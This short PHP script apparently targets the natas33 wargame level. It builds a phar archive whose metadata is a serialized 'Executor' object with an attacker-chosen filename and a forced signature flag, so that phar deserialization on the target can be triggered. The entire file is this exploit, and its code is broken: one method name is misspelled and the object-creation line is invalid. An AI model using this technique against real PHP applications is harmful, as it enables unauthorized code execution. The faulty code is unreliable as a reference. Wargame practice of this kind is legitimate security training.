<?php
  class Executor {
      private $filename = "natas33_test.php";
      private $signature = True;
      private $init = false;

  }

$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromtring("n33.txt", "n33");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o-> new Executor();
$phar->setMetaData($o);
$phar->stopBuffering();
?>